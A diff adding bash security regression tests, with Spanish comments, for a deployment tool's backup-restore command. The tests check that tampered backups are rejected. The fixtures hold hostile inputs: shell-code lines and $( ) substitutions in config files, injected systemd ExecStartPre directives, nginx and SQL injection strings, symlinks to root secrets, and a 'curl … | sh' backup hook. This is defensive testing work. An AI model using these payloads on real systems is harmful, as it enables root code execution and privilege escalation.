@@ -177,6 +177,110 @@ tar -czf "$TMP/malo.tar.gz" -C "$TMP/malo" .
 run cmd_restore "$TMP/malo.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
 check "nombre con ruta dentro" "1" "$r"
 
+section "Una copia es datos: no ejecuta nada al restaurarse"
+# El app.conf de la copia se instalaba tal cual en /etc/orbit/apps, donde root
+# lo carga con '.' en cada 'orbit' —también en los temporizadores—. Una línea
+# de más en un tar.gz manipulado era código de root. Ahora se lee como datos,
+# se comprueba y se vuelve a escribir con save_app.
+falsa() { # falsa <nombre del tar> <app> — con el app.conf que llegue por stdin
+  rm -rf "$TMP/falsa"; mkdir -p "$TMP/falsa"
+  printf 'app=%s\n' "$2" > "$TMP/falsa/manifest"
+  cat > "$TMP/falsa/app.conf"
+  tar -czf "$TMP/$1" -C "$TMP/falsa" .
+}
+mkapp molde node 3077 molde.test
+CONF_BUENA="$(cat "$TMP/etc/apps/molde.conf")"
+rm -f "$TMP/etc/apps/molde.conf"
+rm -f "$TMP/pwned-restore"
+{ printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/'; printf 'touch %s\n' "$TMP/pwned-restore"; } \
+  | falsa evil.tar.gz evil
+SALIDA="$(run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null 2>&1)"; r=$?
+check "una línea de código: se niega" "1" "$r"
+check "y no la ejecuta"            "0" "$([[ -e "$TMP/pwned-restore" ]] && echo 1 || echo 0)"
+check "ni deja la configuración"   "0" "$(app_exists evil && echo 1 || echo 0)"
+check "diciendo qué línea"         "1" "$(grep -c 'no es de fiar: la línea' <<<"$SALIDA")"
+# Y la misma copia sin la línea de más sí entra: lo que se rechaza es el
+# código, no la copia.
+printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' | falsa evil.tar.gz evil
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+check "sin ella, se restaura"      "0" "$r"
+check "escrita por save_app"       "$(grep -c . <<<"$CONF_BUENA")" "$(grep -c "^A_[A-Z_]*='" "$TMP/etc/apps/evil.conf")"
+check "con sus valores"            "3077" "$(load_app evil; printf '%s' "$A_PORT")"
+rm -f "$TMP/etc/apps/evil.conf"; rm -rf "$TMP/apps/evil"
+# Y por dentro de un valor: una sustitución entre comillas dobles —que '.'
+# expandía— no es una forma que escriba Orbit.
+{ printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' | grep -v '^A_BUILD='
+  printf 'A_BUILD="$(touch %s)"\n' "$TMP/pwned-restore"; } | falsa evil.tar.gz evil
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+check "\$( ) entre comillas dobles, no" "1" "$r"
+check "ni se ejecuta"              "0" "$([[ -e "$TMP/pwned-restore" ]] && echo 1 || echo 0)"
+# Parsear no basta: hay campos que acaban donde los interpreta root.
+probar_campo() { # probar_campo <descripción> <campo> <valor ya entrecomillado>
+  { printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' | grep -v "^$2="; printf '%s=%s\n' "$2" "$3"; } \
+    | falsa evil.tar.gz evil
+  run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+  check "$1" "1" "$r"
+  check "$1: nada escrito" "0" "$(app_exists evil && echo 1 || echo 0)"
+  # Limpia pase lo que pase: si un campo se cuela, el siguiente no tiene que
+  # fallar por encontrarse la app ya restaurada.
+  rm -f "$TMP/etc/apps/evil.conf"; rm -rf "$TMP/apps/evil"
+}
+probar_campo "una directiva más en la unidad"  A_LIMIT_MEM "'512M
+ExecStartPre=+/bin/sh -c id'"
+probar_campo "un arranque de dos líneas"       A_START "'node a.js
+ExecStartPre=+/bin/true'"
+# Un usuario que no es ni el de la app ni el de despliegue. Con la tanda
+# corriendo como root —el contenedor Debian de CI— el de despliegue ES root, y
+# ahí root vale: la prueba usa otro de sistema que nunca lo es.
+AJENO=root; [[ "$DEPLOY_USER" == root ]] && AJENO=daemon
+probar_campo "la app corriendo como otro del sistema" A_USER "'$AJENO'"
+probar_campo "o como otra app"                 A_USER "'orbit-otra'"
+probar_campo "aritmética que ejecuta"          A_HEALTH_TIMEOUT "'a[\$(id)]'"
+probar_campo "un dominio que rompe el vhost"   A_DOMAIN "'x.test; include /etc/shadow'"
+probar_campo "una ruta fuera de la release"    A_DOCROOT "'../../etc'"
+probar_campo "una redirección con comillas"    A_REDIRECT "'https://x.test\"; return 200 \"hola'"
+# El usuario que Orbit le daría a esa app sí vale: es el de una app aislada.
+{ printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' | grep -v '^A_USER='; printf "A_USER='%s'\n" "$(_app_username evil)"; } \
+  | falsa evil.tar.gz evil
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+check "su usuario aislado, sí"     "0" "$r"
+rm -f "$TMP/etc/apps/evil.conf"; rm -rf "$TMP/apps/evil"
+# Ni enlaces en lo que se lee: tar los extrae tal cual y root los seguiría.
+printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' | falsa evil.tar.gz evil
+printf 'secreto de root\n' > "$TMP/secreto"; chmod 0600 "$TMP/secreto"
+ln -s "$TMP/secreto" "$TMP/falsa/redirects.list"
+tar -czf "$TMP/evil.tar.gz" -C "$TMP/falsa" .
+SALIDA="$(run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null 2>&1)"; r=$?
+check "un enlace en la copia: no"  "1" "$r"
+check "y no copia lo apuntado"     "0" "$(grep -rc 'secreto de root' "$TMP/etc/redirects" 2>/dev/null | grep -vc ':0$')"
+rm -f "$TMP/falsa/redirects.list"; ln -s "$TMP" "$TMP/falsa/shared"
+tar -czf "$TMP/evil.tar.gz" -C "$TMP/falsa" .
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+check "ni un shared que es enlace" "1" "$r"
+check "que no se queda la app"     "0" "$([[ -L "$TMP/apps/evil/shared" ]] && echo 1 || echo 0)"
+# Ni cosas que no son ficheros: como root, tar crea dispositivos, y el chown -R
+# de shared/ se los daba a la app. Sin root no se puede crear uno, así que se
+# prueba con una tubería con nombre, que cae en la misma regla.
+rm -f "$TMP/falsa/shared"; mkdir -p "$TMP/falsa/shared"; mkfifo "$TMP/falsa/shared/tubo"
+tar -czf "$TMP/evil.tar.gz" -C "$TMP/falsa" .
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1; r=$?
+check "ni un fichero especial"     "1" "$r"
+unset -f probar_campo
+
+section "La contraseña del .env de la copia no es SQL"
+# El rol se recrea con la contraseña de la copia, dentro de una orden que corre
+# como superusuario de PostgreSQL. Con una comilla dentro se salía de la cadena.
+rm -f "$TMP/etc/apps/evil.conf"; rm -rf "$TMP/apps/evil" "$TMP/falsa"; mkdir -p "$TMP/falsa/shared"
+printf 'app=evil\n' > "$TMP/falsa/manifest"
+printf '%s\n' "$CONF_BUENA" | sed 's/^A_NAME=.*/A_NAME='"'"'evil'"'"'/' > "$TMP/falsa/app.conf"
+printf "DATABASE_URL=postgresql://evil:x'; ALTER ROLE evil SUPERUSER; --@127.0.0.1:5432/evil\n" > "$TMP/falsa/shared/.env"
+printf 'CREATE TABLE t();\n' | gzip > "$TMP/falsa/database.sql.gz"
+tar -czf "$TMP/evil.tar.gz" -C "$TMP/falsa" .
+: > "$PSQL"; : > "$DBS"; : > "$ROLES"
+run cmd_restore "$TMP/evil.tar.gz" --yes </dev/null >/dev/null 2>&1
+check "la comilla va doblada"      "1" "$(grep -c "PASSWORD 'x''; ALTER ROLE evil SUPERUSER; --'" "$PSQL")"
+rm -f "$TMP/etc/apps/evil.conf"; rm -rf "$TMP/apps/evil"
+
 section "Copiar todas de una pasada"
 : > "$PSQL"
 rm -f "$BACKUP_DIR"/*.tar.gz
@@ -322,6 +426,34 @@ _restore_conf "$TMP/conf-copia2" >/dev/null
 check "comillas simples de la copia" "it's" "$BACKUP_KEEP"
 check "y el comentario no se cuela"  "3"    "$QUEUE_EVERY"
 _conf_set LETSENCRYPT_EMAIL "yo@example.test"
+
+section "La configuración global de la copia tampoco ejecuta nada"
+# BACKUP_HOOK no es una preferencia: es una orden que root ejecuta con cada
+# copia. Traída de un tar.gz, era la forma de que una copia ejecutara lo que
+# quisiera en la siguiente pasada del cron.
+BACKUP_HOOK=""
+printf "BACKUP_HOOK='curl -s https://x.test/p | sh'\nKEEP_RELEASES='8'\n" > "$TMP/conf-copia3"
+SALIDA="$(_restore_conf "$TMP/conf-copia3" 2>&1)"
+_restore_conf "$TMP/conf-copia3" >/dev/null 2>&1
+check "BACKUP_HOOK no vuelve"      "0" "$(grep -c '^BACKUP_HOOK=.*curl' "$CONF_FILE")"
+check "y en memoria tampoco"       ""  "$BACKUP_HOOK"
+check "pero dice cuál traía"       "1" "$(grep -c 'curl -s https://x.test/p | sh' <<<"$SALIDA")"
+check "lo demás sí"                "8" "$KEEP_RELEASES"
+# Y notify.conf, que root también carga con '.': se lee como datos y lo vuelve
+# a escribir _notify_save.
+rm -rf "$TMP/gl"; mkdir -p "$TMP/gl"; rm -f "$TMP/pwned-notify" "$TMP/etc/notify.conf"
+printf "NOTIFY_WEBHOOK='https://hook.test/x'\ntouch %s\n" "$TMP/pwned-notify" > "$TMP/gl/notify.conf"
+tar -czf "$TMP/_orbit-conf-mala.tar.gz" -C "$TMP/gl" .
+SALIDA="$(_restore_global "$TMP/_orbit-conf-mala.tar.gz" 2>&1)"
+check "notify.conf con código: no" "0" "$([[ -f "$TMP/etc/notify.conf" ]] && echo 1 || echo 0)"
+check "ni se ejecuta"              "0" "$([[ -e "$TMP/pwned-notify" ]] && echo 1 || echo 0)"
+check "y lo dice"                  "1" "$(grep -c 'no lo restauro' <<<"$SALIDA")"
+printf "# Avisos\nNOTIFY_WEBHOOK='https://hook.test/x'\nNOTIFY_MIN_LEVEL='info'\n" > "$TMP/gl/notify.conf"
+tar -czf "$TMP/_orbit-conf-buena.tar.gz" -C "$TMP/gl" .
+_restore_global "$TMP/_orbit-conf-buena.tar.gz" >/dev/null 2>&1
+check "uno bueno sí vuelve"        "1" "$(grep -c "^NOTIFY_WEBHOOK='https://hook.test/x'$" "$TMP/etc/notify.conf" 2>/dev/null)"
+check "reescrito, con 0600"        "600" "$(stat -c '%a' "$TMP/etc/notify.conf" 2>/dev/null)"
+rm -f "$TMP/etc/notify.conf"
 
 section "Ver lo que hay guardado"
 SALIDA="$(run cmd_backup list 2>&1)"
